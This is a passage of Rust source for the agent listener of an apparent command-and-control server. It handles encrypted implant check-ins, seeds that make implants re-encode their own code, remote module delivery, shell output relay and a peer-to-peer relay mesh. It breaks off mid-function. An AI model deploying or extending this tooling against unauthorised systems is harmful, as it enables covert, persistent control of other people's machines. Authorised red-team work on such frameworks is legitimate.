//! Agent-facing listener: an AES-encrypted TCP socket that reuses
//! [`common::CryptoSession`].
//!
//! ## Identity binding
//!
//! On every `accept()` the server generates a fresh `connection_id`
//! (`Uuid::new_v4()`).  That UUID becomes the registry key — not the
//! `agent_id` the agent claims in its `Heartbeat`.  An agent can no longer
//! hijack another agent's registry slot by spoofing its `agent_id`; the
//! worst a rogue agent can do is register under a different `agent_id` label
//! while being tracked under its own, server-assigned `connection_id`.
//!
//! Duplicate `agent_id` reports (common during rapid reconnects) are logged
//! at `WARN` level but allowed; both entries coexist in the registry until
//! the old socket's TCP EOF cleans up the stale entry.

use crate::state::{now_secs, AgentEntry, AppState};
use anyhow::{Context as _, Result};
use common::normalized_transport::NormalizedTransport;
use common::{CryptoSession, Message};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use uuid::Uuid;

const MAX_FRAME_BYTES: u32 = 16 * 1024 * 1024; // 16 MiB hard cap

async fn read_frame<S: AsyncReadExt + Unpin>(r: &mut S, sess: &CryptoSession) -> Result<Message> {
    let len = r.read_u32_le().await?;
    if len > MAX_FRAME_BYTES {
        anyhow::bail!("agent frame too large: {len} bytes");
    }
    let mut buf = vec![0u8; len as usize];
    r.read_exact(&mut buf).await?;
    let plain = sess
        .decrypt(&buf)
        .map_err(|e| anyhow::anyhow!("decrypt failed: {e:?}"))?;
    Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
}

async fn write_frame<S: AsyncWriteExt + Unpin>(
    w: &mut S,
    sess: &CryptoSession,
    msg: &Message,
) -> Result<()> {
    let plain = bincode::serde::encode_to_vec(msg, bincode::config::legacy())?;
    let enc = sess.encrypt(&plain);
    w.write_u32_le(enc.len() as u32).await?;
    w.write_all(&enc).await?;
    Ok(())
}

pub async fn run(
    state: Arc<AppState>,
    addr: std::net::SocketAddr,
    secret: String,
    tls: Arc<rustls::ServerConfig>,
) -> Result<()> {
    // P1-20: Immediately wrap the PSK in LockedSecret so it is mlocked
    // and will be zeroized on drop.  The plaintext String goes out of
    // scope at the end of this function.
    let secret = Arc::new(common::LockedSecret::new(secret.as_bytes()));
    // If mTLS is enabled, rebuild the ServerConfig with a client certificate
    // verifier.  The HTTPS dashboard keeps the original config (no client
    // cert required so browsers can reach the operator GUI).
    let tls = if state.config.mtls_enabled {
        let (cfg, verifier) = crate::tls::build_agent_tls_config(&state.config)
            .context("building mTLS ServerConfig for agent listener")?;
        // P2-16: Store the CnOuVerifier reference for runtime CRL reload.
        if let Some(v) = verifier {
            *state
                .mtls_verifier
                .write()
                .unwrap_or_else(|p| p.into_inner()) = Some(v);
        }
        cfg
    } else {
        tls
    };
    let listener = TcpListener::bind(addr).await?;
    tracing::info!(%addr, "agent listener bound");
    serve(state, listener, secret, tls).await
}

/// Drive a pre-bound listener. Useful for tests that want an ephemeral port.
pub async fn serve(
    state: Arc<AppState>,
    listener: TcpListener,
    secret: Arc<common::LockedSecret>,
    tls: Arc<rustls::ServerConfig>,
) -> Result<()> {
    loop {
        let (sock, peer) = listener.accept().await?;
        let state_c = state.clone();
        let secret_c = secret.clone();
        let tls_c = tls.clone();
        // Assign a server-controlled connection ID before touching the agent.
        let connection_id = Uuid::new_v4().to_string();
        tokio::spawn(async move {
            if let Err(e) = handle_agent(
                sock,
                peer.to_string(),
                connection_id.clone(),
                state_c,
                secret_c,
                tls_c,
            )
            .await
            {
                tracing::warn!(connection_id = %connection_id, %peer, "agent connection ended: {e}");
            }
        });
    }
}

async fn handle_agent(
    sock: TcpStream,
    peer: String,
    connection_id: String,
    state: Arc<AppState>,
    secret: Arc<common::LockedSecret>,
    tls_config: Arc<rustls::ServerConfig>,
) -> Result<()> {
    sock.set_nodelay(true).ok();

    let acceptor = tokio_rustls::TlsAcceptor::from(tls_config);
    // `mut` is needed because negotiate_session_key takes &mut tls_stream.
    let mut tls_stream = acceptor.accept(sock).await?;

    // Forward secrecy: perform an X25519 ECDH exchange before the first
    // application message.  The derived per-session key replaces the
    // static PSK-derived key, providing PFS at the application layer.
    // This is mandatory — if the handshake fails, the connection is rejected.
    //
    // P1-20: The PSK is read from a LockedSecret (mlocked + zeroize-on-drop)
    // rather than a bare String, preventing it from being swapped to disk.
    let session = Arc::new(
        common::forward_secrecy::negotiate_session_key(
            &mut tls_stream,
            secret.as_bytes(),
            false, // server reads client key first
        )
        .await?,
    );

    // P2-17: Extract the client certificate CN (if mTLS) and retain it
    // for identity binding.  The CN is stored in `cert_identity` and later
    // validated against the agent's self-reported `agent_id` at check-in.
    let mut cert_identity: Option<String> = None;
    if state.config.mtls_enabled {
        let (_, server_conn) = tls_stream.get_ref();
        match server_conn.peer_certificates().and_then(|c| c.first()) {
            Some(cert_der) => {
                let cn =
                    crate::tls::extract_cn(cert_der).unwrap_or_else(|| "<unparseable>".to_string());
                tracing::info!(
                    connection_id = %connection_id,
                    %peer,
                    client_cert_cn = %cn,
                    "mTLS: client certificate accepted"
                );
                cert_identity = Some(cn);
            }
            None => {
                tracing::warn!(
                    connection_id = %connection_id,
                    %peer,
                    "mTLS: no client certificate presented; closing connection"
                );
                return Ok(());
            }
        }
    }

    let stream: common::normalized_transport::CleartextStream =
        if let Some(profile) = state.config.agent_traffic_profile {
            tracing::debug!(
                connection_id = %connection_id,
                profile = ?profile,
                "agent listener: enabling server-side normalized transport acceptance"
            );
            NormalizedTransport::accept(tls_stream, profile).await?
        } else {
            Box::new(tls_stream)
        };

    let (mut r, mut w) = tokio::io::split(stream);

    // Bounded channel for the API layer to push commands to this connection.
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Message>(32);

    // Writer task drains commands from the API layer onto the wire.
    let writer_session = session.clone();
    let writer = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            if let Err(e) = write_frame(&mut w, &writer_session, &msg).await {
                tracing::warn!("agent write error: {e}");
                break;
            }
        }
    });

    // Reader loop runs in the connection task.
    let conn_id = connection_id.clone();
    let mut registered = false;
    // P2-17: Move cert_identity into the reader loop so it's available
    // when the Heartbeat message is processed.
    let cert_identity = cert_identity;

    loop {
        let msg = match read_frame(&mut r, &session).await {
            Ok(m) => m,
            Err(e) => {
                tracing::debug!(connection_id = %conn_id, %peer, "agent read terminated: {e}");
                break;
            }
        };

        match msg {
            // ── Protocol version handshake (M-2) ─────────────────────────────
            // Agent sends VersionHandshake as its first message.  Negotiate a
            // compatible version using `negotiate_protocol_version` which
            // returns the highest mutually-supported version or None if the
            // agent is too old to be supported.
            Message::VersionHandshake { version } => {
                match common::negotiate_protocol_version(version) {
                    Some(negotiated) => {
                        if negotiated != version {
                            tracing::info!(
                                connection_id = %conn_id,
                                agent_version = version,
                                negotiated_version = negotiated,
                                "protocol version negotiated (agent downgrade)"
                            );
                        } else {
                            tracing::debug!(
                                connection_id = %conn_id,
                                version,
                                "version handshake completed"
                            );
                        }
                        // Echo the negotiated version so the agent knows what
                        // the server accepted.
                        if tx
                            .send(Message::VersionHandshake {
                                version: negotiated,
                            })
                            .await
                            .is_err()
                        {
                            tracing::warn!(connection_id = %conn_id, "writer task closed during version handshake");
                            break;
                        }
                    }
                    None => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            agent_version = version,
                            min_supported = common::MIN_PROTOCOL_VERSION,
                            "agent protocol version too old; rejecting connection"
                        );
                        // Signal rejection and break.
                        let _ = tx
                            .send(Message::VersionHandshake {
                                version: common::PROTOCOL_VERSION,
                            })
                            .await;
                        break;
                    }
                }
            }
            Message::Heartbeat {
                agent_id,
                status,
                timestamp: _,
                mesh_public_key,
            } => {
                // P2-17: When mTLS is enabled and a client cert was presented,
                // verify the agent's self-reported agent_id matches the cert CN.
                // This binds the logical agent identity to its cryptographic
                // credential, preventing identity spoofing.
                if let Some(ref cn) = cert_identity {
                    if *cn != agent_id {
                        tracing::warn!(
                            connection_id = %conn_id,
                            reported_agent_id = %agent_id,
                            cert_cn = %cn,
                            "P2-17: agent_id does not match mTLS certificate CN; \
                             rejecting registration"
                        );
                        break;
                    }
                }

                // Warn about duplicate agent_id but do not reject — it may be
                // a legitimate reconnect racing with cleanup of the old socket.
                if state
                    .registry
                    .iter()
                    .any(|e| e.value().agent_id == agent_id && e.key() != &conn_id)
                {
                    tracing::warn!(
                        agent_id = %agent_id,
                        new_connection = %conn_id,
                        "duplicate agent_id: another connection is already using this agent_id; \
                         both will remain registered until the old socket closes"
                    );
                }

                // Generate a unique morph seed for this session.  The seed is
                // tracked in `assigned_seeds` to ensure no two active agents
                // share the same transformation.
                let morph_seed = state.generate_unique_seed();
                state.assigned_seeds.insert(morph_seed);

                let entry = AgentEntry {
                    connection_id: conn_id.clone(),
                    agent_id: agent_id.clone(),
                    hostname: status,
                    last_seen: now_secs(),
                    tx: tx.clone(),
                    peer: peer.clone(),
                    morph_seed,
                    text_hash: None,
                    mesh_certificate: None,
                    mesh_public_key,
                    compartment: None,
                    cert_identity: cert_identity.clone(),
                };
                state.registry.insert(conn_id.clone(), entry);
                registered = true;
                tracing::debug!(
                    connection_id = %conn_id,
                    agent_id = %agent_id,
                    %peer,
                    morph_seed = format!("0x{morph_seed:016x}"),
                    "agent registered"
                );

                // Immediately send the morph seed to the agent so it can
                // perform its first re-encode.  Using SetReencodeSeed (not
                // MorphNow) because the first morph should be asynchronous —
                // the agent applies it during its next periodic cycle or on
                // its own schedule.  Operators can use MorphNow later for an
                // immediate synchronous re-encode.
                if tx
                    .send(Message::TaskRequest {
                        task_id: uuid::Uuid::new_v4().to_string(),
                        command: common::Command::SetReencodeSeed { seed: morph_seed },
                        operator_id: None,
                    })
                    .await
                    .is_err()
                {
                    tracing::warn!(
                        connection_id = %conn_id,
                        "failed to send initial morph seed — writer task closed"
                    );
                }

                // ── Mesh certificate issuance ────────────────────────────
                // If the server has a signing key configured, issue a mesh
                // certificate to this agent so it can authenticate during
                // P2P link handshakes.
                if state.config.module_signing_key.is_some() {
                    match crate::api::load_signing_key(&state) {
                        Ok(signing_key) => {
                            // Use the agent's real Ed25519 public key when
                            // available.  If the agent did not provide a key
                            // (e.g. older agent version), fall back to PSK-only
                            // mode: issue a certificate with an all-zeros key and
                            // log a warning.  The agent can still operate but
                            // P2P links will not have cryptographic identity
                            // binding.
                            let (pk, psk_only) = match mesh_public_key {
                                Some(pk) => (pk, false),
                                None => {
                                    tracing::warn!(
                                        connection_id = %conn_id,
                                        agent_id = %agent_id,
                                        "agent did not provide mesh public key — \
                                         issuing PSK-only certificate (no P2P \
                                         identity binding)"
                                    );
                                    ([0u8; 32], true)
                                }
                            };
                            let cert = crate::api::sign_mesh_certificate(
                                &signing_key,
                                &agent_id,
                                &pk,
                                None as Option<&str>,
                            );
                            if psk_only {
                                tracing::warn!(
                                    connection_id = %conn_id,
                                    agent_id = %agent_id,
                                    "issued PSK-only mesh certificate \
                                     (public_key=all-zeros, expires_at={})",
                                    cert.expires_at
                                );
                            } else {
                                tracing::info!(
                                    connection_id = %conn_id,
                                    agent_id = %agent_id,
                                    "issuing mesh certificate with bound Ed25519 \
                                     public key (expires_at={})",
                                    cert.expires_at
                                );
                            }
                            // Store cert in the agent entry.
                            if let Some(mut entry) = state.registry.get_mut(&conn_id) {
                                entry.mesh_certificate = Some(cert.clone());
                            }
                            // Send the certificate to the agent.
                            if tx
                                .send(Message::MeshCertificateIssuance { certificate: cert })
                                .await
                                .is_err()
                            {
                                tracing::warn!(
                                    connection_id = %conn_id,
                                    "failed to send mesh certificate — writer task closed"
                                );
                            }
                        }
                        Err(e) => {
                            tracing::warn!(
                                connection_id = %conn_id,
                                "failed to load signing key for mesh certificate: {:?}",
                                e
                            );
                        }
                    }
                }
            }
            Message::TaskResponse {
                task_id, result, ..
            } => {
                if let Some((_, sender)) = state.pending.remove(&task_id) {
                    if let Err(e) = sender.send(result) {
                        tracing::warn!(%task_id, "failed to deliver TaskResponse to operator (disconnected?): {e:?}");
                    }
                } else {
                    tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
                }
            }
            Message::AuditLog(ev) => {
                state.audit.record(ev);
            }
            Message::MorphResult {
                connection_id: conn_id_ref,
                text_hash,
            } => {
                // Record the agent's post-morph .text hash.  Only accept
                // reports that match this connection to prevent spoofing.
                if conn_id_ref == conn_id {
                    state.update_text_hash(&conn_id, &text_hash);
                    tracing::info!(
                        connection_id = %conn_id,
                        %text_hash,
                        "agent reported post-morph .text hash"
                    );
                } else {
                    tracing::warn!(
                        connection_id = %conn_id,
                        reported_conn = %conn_id_ref,
                        "agent sent MorphResult with mismatched connection_id — ignoring"
                    );
                }
            }
            Message::ModuleRequest { module_id } => {
                // ── C2-tunneled module download ──────────────────────
                // The agent requested a module by ID.  Locate the file on
                // disk, sign + encrypt it, and send it back as a
                // ModuleResponse through the same C2 channel.
                tracing::info!(
                    connection_id = %conn_id,
                    %module_id,
                    "agent requested module via C2 channel"
                );

                let module_dir = &state.config.modules_dir;
                // ── Platform-aware module resolution ───────────────────
                // The C2-tunnelled module path must serve the correct file
                // regardless of which OS the *server* was compiled on.
                // Previously this used `cfg!(target_os = "windows")` which
                // reflected the server's OS, not the requesting agent's.
                // We now probe the modules directory for all known platform
                // extensions and use whichever file is present.  This lets
                // a Linux-hosted server serve `.dll` modules to Windows
                // agents, `.so` to Linux agents, and `.dylib` to macOS
                // agents — as long as the operator deposited the right
                // file for each platform.
                const PLATFORM_EXTS: &[&str] = &["dll", "so", "dylib"];

                // ── Path traversal protection ──────────────────────────
                // Reject module_id with characters outside the strict
                // allowlist (alphanumeric, hyphen, underscore).  This
                // blocks direct traversal like "../../etc/passwd".
                if !module_id
                    .chars()
                    .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
                {
                    tracing::warn!(
                        connection_id = %conn_id,
                        %module_id,
                        "module_id contains invalid characters — rejecting"
                    );
                    let _ = tx
                        .send(Message::ModuleResponse {
                            module_id: module_id.clone(),
                            encrypted_blob: Vec::new(),
                        })
                        .await;
                    continue;
                }

                // Try each platform extension until we find one that exists.
                // The first match wins; if none exist the agent receives an
                // empty ModuleResponse.
                let (module_path, matched_ext) = match PLATFORM_EXTS.iter().find_map(|&ext| {
                    let p = std::path::Path::new(module_dir).join(format!("{module_id}.{ext}"));
                    if p.exists() {
                        Some((p, ext))
                    } else {
                        None
                    }
                }) {
                    Some(found) => found,
                    None => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            %module_id,
                            "module file not found for any platform extension (dll/so/dylib)"
                        );
                        let _ = tx
                            .send(Message::ModuleResponse {
                                module_id: module_id.clone(),
                                encrypted_blob: Vec::new(),
                            })
                            .await;
                        continue;
                    }
                };
                tracing::debug!(
                    connection_id = %conn_id,
                    %module_id,
                    %matched_ext,
                    "resolved module file"
                );

                // Canonicalize both the resolved path and the modules
                // directory, then verify the file stays within the
                // directory.  This catches symlink-based traversal even
                // when module_id passes the allowlist above.
                let canon_file = match module_path.canonicalize() {
                    Ok(p) => p,
                    Err(_) => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            %module_id,
                            "module file not found: {}",
                            module_path.display()
                        );
                        let _ = tx
                            .send(Message::ModuleResponse {
                                module_id: module_id.clone(),
                                encrypted_blob: Vec::new(),
                            })
                            .await;
                        continue;
                    }
                };
                let canon_dir = std::path::Path::new(module_dir)
                    .canonicalize()
                    .unwrap_or_else(|_| std::path::PathBuf::from(module_dir));
                if !canon_file.starts_with(&canon_dir) {
                    tracing::warn!(
                        connection_id = %conn_id,
                        %module_id,
                        "module path escapes modules_dir — rejecting"
                    );
                    let _ = tx
                        .send(Message::ModuleResponse {
                            module_id: module_id.clone(),
                            encrypted_blob: Vec::new(),
                        })
                        .await;
                    continue;
                }

                let result = async {
                    let module_bytes = tokio::fs::read(&module_path).await.map_err(|e| {
                        tracing::warn!(path = %module_path.display(), "module not found: {e}");
                        e
                    })?;

                    // Enforce the configured maximum module size.  The push
                    // API endpoint already checks this before base64-decoding,
                    // but this C2-tunnelled path previously skipped the check,
                    // allowing an oversized module to be signed, encrypted,
                    // and sent over the wire.
                    let max_size = state.config.max_module_size;
                    if module_bytes.len() > max_size {
                        tracing::warn!(
                            connection_id = %conn_id,
                            %module_id,
                            size = module_bytes.len(),
                            max = max_size,
                            "module exceeds max_module_size — rejecting"
                        );
                        anyhow::bail!(
                            "module {} is {} bytes, exceeding the {}-byte limit",
                            module_id,
                            module_bytes.len(),
                            max_size
                        );
                    }

                    // Sign the module with the server's Ed25519 key (if
                    // configured).  The signing format is identical to the
                    // operator-facing `push_module` API endpoint.
                    let signed = match &state.config.module_signing_key {
                        Some(_) => {
                            let signing_key = crate::api::load_signing_key(&state)
                                .map_err(|e| anyhow::anyhow!("{e:?}"))?;
                            crate::api::sign_module(&signing_key, &module_bytes)
                        }
                        None => module_bytes,
                    };

                    // Encrypt with the shared AES key.
                    let crypto = crate::api::load_module_crypto(&state)
                        .map_err(|e| anyhow::anyhow!("{e:?}"))?;
                    let encrypted_blob = crypto.encrypt(&signed);

                    Ok::<Vec<u8>, anyhow::Error>(encrypted_blob)
                }
                .await;

                let resp = match result {
                    Ok(blob) => Message::ModuleResponse {
                        module_id: module_id.clone(),
                        encrypted_blob: blob,
                    },
                    Err(e) => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            %module_id,
                            "failed to serve module request: {e}"
                        );
                        // Send an empty response so the agent knows the
                        // request was processed (even though it failed).
                        Message::ModuleResponse {
                            module_id: module_id.clone(),
                            encrypted_blob: Vec::new(),
                        }
                    }
                };

                if tx.send(resp).await.is_err() {
                    tracing::warn!(
                        connection_id = %conn_id,
                        "failed to send ModuleResponse — writer closed"
                    );
                }
            }
            Message::P2pTopologyReport { agent_id, children } => {
                // ── P2P topology update ────────────────────────────────
                // An agent (directly connected or relayed through parents)
                // reports its child links.  Update the server-side topology
                // map so commands can be routed through the relay chain.
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    child_count = children.len(),
                    "received P2P topology report"
                );
                state.update_topology(&agent_id, &children).await;
            }
            Message::P2pForward {
                child_link_id,
                data,
            } => {
                // ── P2P forwarded data from child → server ─────────────
                // A child agent sent data (e.g. a TaskResponse) through its
                // parent relay chain.  The `data` field contains the
                // **plaintext** (bincode-serialized `Message`) that the
                // child intended for the server.  We deserialize and
                // re-dispatch it the same way as a direct agent message.

                tracing::debug!(
                    connection_id = %conn_id,
                    child_link_id,
                    data_len = data.len(),
                    "received P2P forwarded data from child"
                );

                // Resolve the parent's agent_id from its connection_id.
                let parent_agent_id = state.registry.get(&conn_id).map(|e| e.agent_id.clone());

                let parent_agent_id = match parent_agent_id {
                    Some(id) => id,
                    None => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            child_link_id,
                            "P2P forward: parent connection not in registry — dropping"
                        );
                        continue;
                    }
                };

                // Reverse-lookup: find the child agent_id from the
                // topology's child_link_map.  The map stores
                // (parent_agent_id, child_agent_id) → link_id, so we
                // search for the entry matching the parent + link_id.
                let child_agent_id = {
                    let topo = state.topology.read().await;
                    topo.child_link_map
                        .iter()
                        .find(|((parent, _child), &lid)| {
                            parent == &parent_agent_id && lid == child_link_id
                        })
                        .map(|((_parent, child), _lid)| child.clone())
                    // topo read lock dropped here
                };

                let child_agent_id = match child_agent_id {
                    Some(id) => id,
                    None => {
                        tracing::warn!(
                            connection_id = %conn_id,
                            child_link_id,
                            parent_agent_id = %parent_agent_id,
                            "P2P forward: child_link_id not found in topology — dropping"
                        );
                        continue;
                    }
                };

                // Deserialize the inner message.
                let inner_msg: Message =
                    match bincode::serde::decode_from_slice(&data, bincode::config::legacy()) {
                        Ok((msg, _remainder)) => msg,
                        Err(e) => {
                            tracing::warn!(
                                connection_id = %conn_id,
                                child_agent_id = %child_agent_id,
                                error = %e,
                                "P2P forward: failed to deserialize inner message — dropping"
                            );
                            continue;
                        }
                    };

                tracing::debug!(
                    connection_id = %conn_id,
                    child_agent_id = %child_agent_id,
                    "P2P forward: re-dispatching inner message"
                );

                // Re-dispatch the inner message as if it came from the
                // child agent directly.  Some message types require
                // special handling because they reference `conn_id` or
                // `tx` which belong to the *parent*, not the child.
                match inner_msg {
                    Message::TaskResponse {
                        task_id, result, ..
                    } => {
                        tracing::info!(
                            child_agent_id = %child_agent_id,
                            %task_id,
                            "P2P forwarded TaskResponse from child"
                        );
                        if let Some((_, sender)) = state.pending.remove(&task_id) {
                            if let Err(e) = sender.send(result) {
                                tracing::warn!(%task_id, "failed to deliver forwarded TaskResponse to operator: {e:?}");
                            }
                        } else {
                            tracing::debug!(
                                %task_id,
                                "forwarded TaskResponse with no pending waiter"
                            );
                        }
                    }
                    Message::AuditLog(ev) => {
                        tracing::debug!(
                            child_agent_id = %child_agent_id,
                            "P2P forwarded AuditLog from child"
                        );
                        state.audit.record(ev);
                    }
                    Message::MorphResult {
                        connection_id: _reported_conn,
                        text_hash,
                    } => {
                        // For forwarded MorphResult we record the hash
                        // under the child's agent_id (look up by agent_id
                        // rather than by connection_id, since the child is
                        // not directly connected).
                        tracing::info!(
                            child_agent_id = %child_agent_id,
                            %text_hash,
                            "P2P forwarded MorphResult from child"
                        );
                        if let Some(entry) = state.find_by_agent_id(&child_agent_id) {
                            // Use the child's actual connection_id for the
                            // hash update (not the parent's).
                            state.update_text_hash(&entry.connection_id, &text_hash);
                        } else {
                            // Child might not be in the registry (deeply
                            // nested via multiple hops).  Store under a
                            // synthetic key so we don't lose the data.
                            state.update_text_hash(&child_agent_id, &text_hash);
                        }
                    }
                    Message::P2pTopologyReport { agent_id, children } => {
                        // A nested child is reporting its own children.
                        tracing::info!(
                            connection_id = %conn_id,
                            relayed_from = %child_agent_id,
                            %agent_id,
                            child_count = children.len(),
                            "P2P forwarded topology report from child"
                        );
                        state.update_topology(&agent_id, &children).await;
                    }
                    Message::P2pLinkFailureReport {
                        agent_id,
                        dead_peer_id,
                        link_type,
                        uptime_secs,
                        latency_ms,
                        packet_loss,
                        bandwidth_bps,
                    } => {
                        tracing::info!(
                            connection_id = %conn_id,
                            relayed_from = %child_agent_id,
                            %agent_id,
                            %dead_peer_id,
                            "P2P forwarded link failure report from child"
                        );
                        state
                            .record_link_failure(
                                &agent_id,
                                &dead_peer_id,
                                link_type,
                                uptime_secs,
                                latency_ms,
                                packet_loss,
                                bandwidth_bps,
                            )
                            .await;
                    }
                    Message::ShellOutput {
                        session_id,
                        data: shell_data,
                        stream,
                    } => {
                        let stream_name = match stream {
                            common::ShellStream::Stdout => "stdout",
                            common::ShellStream::Stderr => "stderr",
                        };
                        tracing::info!(
                            child_agent_id = %child_agent_id,
                            session_id,
                            stream = stream_name,
                            data_len = shell_data.len(),
                            "P2P forwarded shell output from child"
                        );
                        let buffer_key = (child_agent_id.clone(), session_id);
                        let entry =
                            state
                                .shell_output_buffers
                                .entry(buffer_key)
                                .or_insert_with(|| {
                                    std::sync::Mutex::new(
                                        std::collections::VecDeque::with_capacity(256),
                                    )
                                });
                        if let Ok(mut q) = entry.lock() {
                            q.push_back(shell_data.clone());
                            while q.len() > 2000 {
                                q.pop_front();
                            }
                        }
                        state.audit.record(common::AuditEvent {
                            timestamp: now_secs(),
                            agent_id: child_agent_id,
                            user: "shell".to_string(),
                            action: format!(
                                "ShellOutput(session={session_id}, stream={stream_name}, via_p2p)"
                            ),
                            outcome: common::Outcome::Success,
                            details: format!("{} bytes", shell_data.len()),
                            tampered: false,
                        });
                    }
                    Message::ModuleRequest { module_id } => {
                        // Forwarded module request from a child.  Load,
                        // sign, and encrypt the module the same way as a
                        // direct request, but route the response back
                        // through the P2P relay chain.
                        tracing::info!(
                            child_agent_id = %child_agent_id,
                            %module_id,
                            "P2P forwarded module request from child"
                        );

                        let resp = {
                            let module_dir = &state.config.modules_dir;
                            const PLATFORM_EXTS: &[&str] = &["dll", "so", "dylib"];

                            // Path traversal protection.
                            if !module_id
                                .chars()
                                .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
                            {
                                tracing::warn!(
                                    child_agent_id = %child_agent_id,
                                    %module_id,
                                    "forwarded module_id has invalid chars"
                                );
                                Message::ModuleResponse {
                                    module_id: module_id.clone(),
                                    encrypted_blob: Vec::new(),
                                }
                            } else {
                                // Resolve module file.
                                let found = PLATFORM_EXTS.iter().find_map(|&ext| {
                                    let p = std::path::Path::new(module_dir)
                                        .join(format!("{module_id}.{ext}"));
                                    if p.exists() {
                                        Some(p)
                                    } else {
                                        None
                                    }
                                });

                                match found {
                                    Some(module_path) => {
                                        // Canonicalize + traversal check.
                                        let canon_file = match module_path.canonicalize() {
                                            Ok(p) => p,
                                            Err(_) => {
                                                tracing::warn!(
                                                    child_agent_id = %child_agent_id,
                                                    %module_id,
                                                    "module file canonicalize failed"
                                                );
                                                let _ = crate::state::send_to_child(
                                                    &state,
                                                    &child_agent_id,
                                                    &Message::ModuleResponse {
                                                        module_id: module_id.clone(),
                                                        encrypted_blob: Vec::new(),
                                                    },
                                                )
                                                .await;
                                                continue;
                                            }
                                        };
                                        let canon_dir = std::path::Path::new(module_dir)
                                            .canonicalize()
                                            .unwrap_or_else(|_| {
                                                std::path::PathBuf::from(module_dir)
                                            });
                                        if !canon_file.starts_with(&canon_dir) {
                                            tracing::warn!(
                                                child_agent_id = %child_agent_id,
                                                %module_id,
                                                "forwarded module path escapes modules_dir"
                                            );
                                            Message::ModuleResponse {
                                                module_id: module_id.clone(),
                                                encrypted_blob: Vec::new(),
                                            }
                                        } else {
                                            // Read, sign, encrypt.
                                            match tokio::fs::read(&canon_file).await {
                                                Ok(module_bytes) => {
                                                    let max_size = state.config.max_module_size;
                                                    if module_bytes.len() > max_size {
                                                        tracing::warn!(
                                                            child_agent_id = %child_agent_id,
                                                            %module_id,
                                                            size = module_bytes.len(),
                                                            max = max_size,
                                                            "forwarded module exceeds size limit"
                                                        );
                                                        Message::ModuleResponse {
                                                            module_id: module_id.clone(),
                                                            encrypted_blob: Vec::new(),
                                                        }
                                                    } else {
                                                        let signed = match &state
                                                            .config
                                                            .module_signing_key
                                                        {
                                                            Some(_) => {
                                                                match crate::api::load_signing_key(
                                                                    &state,
                                                                ) {
                                                                    Ok(key) => {
                                                                        crate::api::sign_module(
                                                                            &key,
                                                                            &module_bytes,
                                                                        )
                                                                    }
                                                                    Err(_) => module_bytes,
                                                                }
                                                            }
                                                            None => module_bytes,
                                                        };
                                                        match crate::api::load_module_crypto(&state)
                                                        {
                                                            Ok(crypto) => Message::ModuleResponse {
                                                                module_id: module_id.clone(),
                                                                encrypted_blob: crypto
                                                                    .encrypt(&signed),
                                                            },
                                                            Err(_) => {
                                                                tracing::warn!(
                                                                    child_agent_id = %child_agent_id,
                                                                    "module crypto not available"
                                                                );
                                                                Message::ModuleResponse {
                                                                    module_id: module_id.clone(),
                                                                    encrypted_blob: Vec::new(),
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                                Err(e) => {
                                                    tracing::warn!(
                                                        child_agent_id = %child_agent_id,
                                                        %module_id,
                                                        "failed to read forwarded module: {e}"
                                                    );
                                                    Message::ModuleResponse {
                                                        module_id: module_id.clone(),
                                                        encrypted_blob: Vec::new(),
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    None => {
                                        tracing::warn!(
                                            child_agent_id = %child_agent_id,
                                            %module_id,
                                            "forwarded module not found"
                                        );
                                        Message::ModuleResponse {
                                            module_id: module_id.clone(),
                                            encrypted_blob: Vec::new(),
                                        }
                                    }
                                }
                            }
                        };

                        if let Err(e) =
                            crate::state::send_to_child(&state, &child_agent_id, &resp).await
                        {
                            tracing::warn!(
                                child_agent_id = %child_agent_id,
                                error = %e,
                                "failed to route ModuleResponse to forwarded child"
                            );
                        }
                    }
                    other => {
                        tracing::debug!(
                            child_agent_id = %child_agent_id,
                            "P2P forward: dropping unhandled inner message type"
                        );
                        let _ = &other;
                    }
                }
            }
            Message::P2pLinkFailureReport {
                agent_id,
                dead_peer_id,
                link_type,
                uptime_secs,
                latency_ms,
                packet_loss,
                bandwidth_bps,
            } => {
                // ── P2P link failure report ─────────────────────
                // An agent reports that a peer link has died.  Record
                // the failure in the topology map and log quality metrics.
                let link_kind = match link_type {
                    0 => "parent",
                    1 => "child",
                    _ => "peer",
                };
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    %dead_peer_id,
                    link_kind,
                    uptime_secs,
                    latency_ms,
                    packet_loss,
                    bandwidth_bps,
                    "received P2P link failure report"
                );
                state
                    .record_link_failure(
                        &agent_id,
                        &dead_peer_id,
                        link_type,
                        uptime_secs,
                        latency_ms,
                        packet_loss,
                        bandwidth_bps,
                    )
                    .await;
            }
            Message::P2pEnhancedTopologyReport {
                agent_id,
                peers,
                routes,
            } => {
                // ── Enhanced mesh topology ──────────────────────────
                // An agent reports its peer links and known routes with
                // quality/latency data.  Merge into the mesh controller.
                tracing::info!(
                    connection_id = %conn_id,
                    %agent_id,
                    peer_count = peers.len(),
                    route_count = routes.len(),
                    "received enhanced mesh topology report"
                );
                let mut mesh = state.mesh_controller.write().await;
                mesh.merge_enhanced_topology(&agent_id, &peers, &routes);
            }
            Message::P2pRouteTooDeep {
                destination,
                origin,
                hop_count,
            } => {
                // ── Route too deep notification ─────────────────────
                // A mesh relay agent dropped a frame because the hop
                // count exceeded the maximum.  Log for operator awareness.
                tracing::warn!(
                    connection_id = %conn_id,
                    %destination,
                    %origin,
                    hop_count,
                    "route too deep — mesh frame dropped"
                );
            }
            Message::MeshCertificateRenewal => {
                // Agent is requesting a certificate renewal.  Re-issue if
                // the signing key is available.
                if state.config.module_signing_key.is_some() {
                    let (agent_id, compartment, heartbeat_pk, cert_pk) = state
                        .registry
                        .get(&conn_id)
                        .map(|e| {
                            (
                                e.agent_id.clone(),
                                e.compartment.clone(),
                                e.mesh_public_key,
